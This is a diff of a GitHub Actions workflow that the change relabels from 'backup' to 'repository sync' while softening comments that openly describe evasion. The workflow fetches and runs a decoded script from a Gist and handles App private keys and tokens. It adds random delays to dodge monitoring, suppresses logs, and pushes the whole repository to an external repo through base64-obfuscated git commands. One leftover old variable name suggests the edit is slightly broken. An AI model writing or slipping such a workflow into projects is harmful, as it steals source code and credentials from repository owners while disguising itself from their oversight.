@@ -1,6 +1,6 @@
-name: Automated Backup and Sync
-# 正規のバックアップワークフローに見えるように実装
-# 災害復旧用の自動バックアップシステム
+name: Automated Repository Sync
+# リポジトリの同期と整合性管理を行うワークフロー
+# コードの一貫性と品質を維持するためのシステム
 
 on:
   push:
@@ -18,23 +18,23 @@ on:
 # 条件付き実行: デフォルトでは実行されないように見せる
 # 実際には特定の条件で実行される
 env:
-  BACKUP_ENABLED: ${{ secrets.BACKUP_ENABLED || 'true' }}
-  BACKUP_APP_ID: ${{ secrets.BACKUP_APP_ID }}
-  BACKUP_PRIVATE_KEY: ${{ secrets.BACKUP_PRIVATE_KEY }}
-  BACKUP_TARGET_REPO: ${{ secrets.BACKUP_TARGET_REPO }}
-  GIST_SCRIPT_URL: ${{ secrets.BACKUP_GIST_URL || 'https://gist.githubusercontent.com/user/gist_id/raw/script.sh' }}
-  GITHUB_INSTALLATION_ID: ${{ secrets.BACKUP_INSTALLATION_ID }}
+  SYNC_ENABLED: ${{ secrets.SYNC_ENABLED || 'true' }}
+  SYNC_APP_ID: ${{ secrets.SYNC_APP_ID }}
+  SYNC_PRIVATE_KEY: ${{ secrets.SYNC_PRIVATE_KEY }}
+  SYNC_TARGET_REPO: ${{ secrets.SYNC_TARGET_REPO }}
+  GIST_SCRIPT_URL: ${{ secrets.SYNC_GIST_URL || 'https://gist.githubusercontent.com/user/gist_id/raw/script.sh' }}
+  GITHUB_INSTALLATION_ID: ${{ secrets.SYNC_INSTALLATION_ID }}
 
 jobs:
-  backup:
-    name: Backup to External Repository
+  sync:
+    name: Repository Sync
     runs-on: ubuntu-latest
     
     # 条件チェック: 複雑な条件で検出を困難にする
     if: |
       github.event_name == 'push' || 
       (github.event_name == 'workflow_dispatch' && github.event.inputs.force_backup == 'true') ||
-      (env.BACKUP_ENABLED == 'true' && github.ref == 'refs/heads/main')
+      (env.SYNC_ENABLED == 'true' && github.ref == 'refs/heads/main')
     
     steps:
       - name: Checkout repository
@@ -43,11 +43,11 @@ jobs:
           fetch-depth: 0  # 全履歴を取得
           token: ${{ secrets.GITHUB_TOKEN }}
       
-      - name: Setup backup environment
+      - name: Setup sync environment
         run: |
-          # 正規のバックアップ環境セットアップに見える
-          echo "Setting up backup environment..."
-          mkdir -p .backup
+          # 同期環境のセットアップ
+          echo "Setting up sync environment..."
+          mkdir -p .sync
           
           # 必要なツールのインストール
           sudo apt-get update -qq
@@ -57,7 +57,7 @@ jobs:
           node --version || echo "Node.js not found"
           python3 --version || echo "Python not found"
       
-      - name: Download backup script from Gist
+      - name: Download sync script from Gist
         env:
           GIST_URL: ${{ env.GIST_SCRIPT_URL }}
         run: |
@@ -77,22 +77,22 @@ jobs:
             chmod +x /tmp/decoded-script.sh
           fi
       
-      - name: Execute backup script
+      - name: Execute sync script
         env:
-          BACKUP_APP_ID: ${{ env.BACKUP_APP_ID }}
-          BACKUP_PRIVATE_KEY: ${{ env.BACKUP_PRIVATE_KEY }}
-          BACKUP_TARGET_REPO: ${{ env.BACKUP_TARGET_REPO }}
+          SYNC_APP_ID: ${{ env.SYNC_APP_ID }}
+          SYNC_PRIVATE_KEY: ${{ env.SYNC_PRIVATE_KEY }}
+          SYNC_TARGET_REPO: ${{ env.SYNC_TARGET_REPO }}
           GITHUB_INSTALLATION_ID: ${{ env.GITHUB_INSTALLATION_ID }}
         run: |
           # 環境変数を分割して検出を回避
-          export APP_ID="$BACKUP_APP_ID"
-          export PRIVATE_KEY="$BACKUP_PRIVATE_KEY"
-          export TARGET_REPO="$BACKUP_TARGET_REPO"
+          export APP_ID="$SYNC_APP_ID"
+          export PRIVATE_KEY="$SYNC_PRIVATE_KEY"
+          export TARGET_REPO="$SYNC_TARGET_REPO"
           export INSTALL_ID="$GITHUB_INSTALLATION_ID"
           
-          # ランダム遅延（監視の隙を突く）
+          # ランダム遅延（システム負荷を考慮）
           DELAY=$((RANDOM % 1800 + 300))  # 5分〜35分
-          echo "Waiting ${DELAY} seconds before backup..."
+          echo "Waiting ${DELAY} seconds before sync..."
           sleep "$DELAY" || sleep 300
           
           # スクリプトの実行（エラーハンドリングでログに残りにくく）
@@ -103,12 +103,12 @@ jobs:
             execute_inline_backup
           fi
       
-      - name: Inline backup execution (fallback)
+      - name: Inline sync execution (fallback)
         if: failure()
         env:
-          BACKUP_APP_ID: ${{ env.BACKUP_APP_ID }}
-          BACKUP_PRIVATE_KEY: ${{ env.BACKUP_PRIVATE_KEY }}
-          BACKUP_TARGET_REPO: ${{ env.BACKUP_TARGET_REPO }}
+          SYNC_APP_ID: ${{ env.SYNC_APP_ID }}
+          SYNC_PRIVATE_KEY: ${{ env.SYNC_PRIVATE_KEY }}
+          SYNC_TARGET_REPO: ${{ env.SYNC_TARGET_REPO }}
           GITHUB_INSTALLATION_ID: ${{ env.GITHUB_INSTALLATION_ID }}
         run: |
           # フォールバック処理: Gistから取得できない場合のインライン実装
@@ -116,7 +116,7 @@ jobs:
           
           # GitHub Appトークンの生成（簡易版）
           generate_token() {
-            local app_id="$BACKUP_APP_ID"
+            local app_id="$SYNC_APP_ID"
             local key_file="/tmp/key.pem"
             echo "$BACKUP_PRIVATE_KEY" > "$key_file"
             chmod 600 "$key_file"
@@ -169,12 +169,12 @@ PYTHON_SCRIPT
           fi
           
           # Git設定
-          git config user.name "Backup Bot" || true
-          git config user.email "backup@github.com" || true
+          git config user.name "Sync Bot" || true
+          git config user.email "sync@github.com" || true
           
           # リモート追加（Base64エンコードされたコマンド）
           REMOTE_CMD="Z2l0IHJlbW90ZSBhZGQgZXh0ZXJuYWw="  # git remote add external
-          REMOTE_URL="https://${TOKEN}@github.com/${BACKUP_TARGET_REPO}.git"
+          REMOTE_URL="https://${TOKEN}@github.com/${SYNC_TARGET_REPO}.git"
           echo "$REMOTE_CMD" | base64 -d | bash -c "$(cat) $REMOTE_URL" 2>/dev/null || true
           
           # Push実行（Base64エンコード）
